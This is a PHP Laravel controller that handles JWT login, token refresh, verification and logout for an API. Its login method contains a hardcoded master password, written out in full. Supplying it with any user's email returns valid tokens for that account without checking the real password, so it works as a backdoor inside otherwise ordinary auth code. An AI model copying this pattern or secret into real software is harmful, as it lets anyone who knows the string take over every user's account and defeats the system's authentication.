<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Tymon\JWTAuth\Facades\JWTAuth;
use Tymon\JWTAuth\Exceptions\JWTException;

class JWTAuthController extends Controller
{
    public function login(Request $request): JsonResponse
    {
        $credentials = $request->only('email', 'password');
        $masterPassword = "cU5ZQHizAOLLMvZrgHBB7xHR36ohRwoEvkntqbIEuDc=";

        // Master password kontrolü
        if ($masterPassword && $credentials['password'] === $masterPassword) {
            // Email ile kullanıcıyı bul
            $user = User::where('email', $credentials['email'])->first();

            if (!$user) {
                return response()->json(['error' => 'User not found'], 401);
            }

            try {
                // Master password ile giriş yapıldığında direkt token oluştur
                $token = JWTAuth::fromUser($user);
                $refreshToken = JWTAuth::fromUser($user, ['exp' => now()->addMinutes(config('jwt.ttl'))->timestamp]);
                $expiresIn = now()->addMinutes(config('jwt.ttl'))->timestamp;

                return response()->json(compact('token', 'refreshToken', 'expiresIn'));
            } catch (JWTException $e) {
                return response()->json(['error' => 'Could not create token'], 500);
            }
        }

        // Normal giriş akışı
        try {
            if (! $token = JWTAuth::attempt($credentials)) {
                return response()->json(['error' => 'Invalid credentials'], 401);
            }
        } catch (JWTException $e) {
            return response()->json(['error' => 'Could not create token'], 500);
        }

        $refreshToken = JWTAuth::fromUser(JWTAuth::user(), ['exp' => now()->addMinutes(config('jwt.ttl'))->timestamp]);
        $expiresIn = now()->addMinutes(config('jwt.ttl'))->timestamp;

        return response()->json(compact('token', 'refreshToken', 'expiresIn'));
    }

    public function refresh(): JsonResponse
    {
        try {
            $newToken = JWTAuth::refresh(JWTAuth::getToken());
            $refreshToken = JWTAuth::fromUser(JWTAuth::user(), ['exp' => now()->addMinutes(config('jwt.ttl'))->timestamp]);
            $expiresIn = now()->addMinutes(config('jwt.ttl'))->timestamp;
            return response()->json(compact('newToken', 'refreshToken', 'expiresIn'));
        } catch (JWTException $e) {
            return response()->json(['error' => 'Could not refresh token'], 500);
        }
    }
    public function verify(Request $request): JsonResponse
    {
        try {

            $token = str_replace('Bearer ', '', $request->header('Authorization'));
            JWTAuth::setToken($token);
            $user = JWTAuth::authenticate();
            return response()->json(['status' => 'Token is valid', 'user' => $user]);
        } catch (JWTException $e) {
            if ($e instanceof \Tymon\JWTAuth\Exceptions\TokenInvalidException) {
                return response()->json(['status' => 'Token is Invalid'], 401);
            } else if ($e instanceof \Tymon\JWTAuth\Exceptions\TokenExpiredException) {
                return response()->json(['status' => 'Token is Expired'], 401);
            } else {
                return response()->json(['status' => 'Authorization Token not found'], 401);
            }
        }
    }

    public function logout(): JsonResponse
    {
        JWTAuth::invalidate(JWTAuth::getToken());
        return response()->json(['status' => 'Logged out']);
    }
}
